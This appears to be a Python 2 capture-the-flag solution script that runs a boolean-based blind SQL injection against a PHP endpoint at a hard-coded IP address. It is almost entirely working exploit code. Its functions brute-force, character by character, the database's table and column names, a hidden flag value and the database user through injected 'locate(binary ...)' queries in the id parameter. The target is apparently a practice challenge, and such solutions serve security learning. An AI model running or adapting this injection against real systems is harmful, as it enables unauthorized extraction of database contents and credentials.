#coding=utf-8
import requests
rs = requests.session()

'''
这里是第二个flag，也是正确的那个flag
修改limit的值
'''
def table():
    flag = ''
    for j in xrange(1, 100):
        temp = '!@$%^&*()_+=-|}{POIU YTREWQASDFGHJKL:?><MNBVCXZqwertyuiop[];lkjhgfdsazxcvbnm,./1234567890`~'
        key = 0
        for i in temp:
            url = "http://120.24.86.145:9004/Once_More.php?id=1'and  (select locate(binary'" + str(i) + "',(select table_name from information_schema.tables where table_schema=database() limit 0,1)," + str(j) + "))=" + str(j) + "%23"
            r1 = rs.get(url)
            # print url
            if "Hello" in r1.text:
                print str(i) + " -----" + str(j)
                flag += str(i)
                print "[*] : " + flag
                key = 1
        if key ==0:
            break

def column():
    flag = ''
    for j in xrange(1, 100):
        temp = '!@$%^&*()_+=-|}{POIU YTREWQASDFGHJKL:?><MNBVCXZqwertyuiop[];lkjhgfdsazxcvbnm,./1234567890`~'
        key =0
        for i in temp:
            url = "http://120.24.86.145:9004/Once_More.php?id=1'and  (select locate(binary'" + str(
                i) + "',(select column_name from information_schema.columns where table_schema=database() limit 0,1)," + str(
                j) + "))=" + str(j) + "%23"
            r1 = rs.get(url)
            # print url
            if "Hello" in r1.text:
                print str(i) + " -----" + str(j)
                flag += str(i)
                print "[*] : " + flag
                key = 1
        if key ==0:
            break

def flag2():
    flag =''
    for j in xrange(1, 100):
        temp = '!@$%^&*()_+=-|}{POIU YTREWQASDFGHJKL:?><MNBVCXZqwertyuiop[];lkjhgfdsazxcvbnm,./1234567890`~'
        key = 0
        for i in temp:
            url = "http://120.24.86.145:9004/Once_More.php?id=1'and  (select locate(binary'"+str(i)+"',(select flag2 from flag2),"+str(j)+"))="+str(j)+"%23"
            r1 = rs.get(url)
            # print url
            if "Hello" in r1.text:
                print str(i)+" -----"+str(j)
                flag += str(i)
                print "[*] : "+flag
                key = 1
        if key ==0:
            break

def user():
    flag =''
    for j in xrange(1, 100):
        temp = '!@$%^&*()_+=-|}{POIU YTREWQASDFGHJKL:?><MNBVCXZqwertyuiop[];lkjhgfdsazxcvbnm,./1234567890`~'
        key = 0
        for i in temp:
            url = "http://120.24.86.145:9004/Once_More.php?id=1'and (select locate(binary'"+str(i)+"',(select user()),"+str(j)+"))="+str(j)+"%23"
            r1 = rs.get(url)
            # print url
            if "Hello" in r1.text:
                print str(i)+" -----"+str(j)
                flag += str(i)
                key = 1
        if key ==0:
            print "[*] : " + flag
            break


# flag2()
# table()
# column()
user()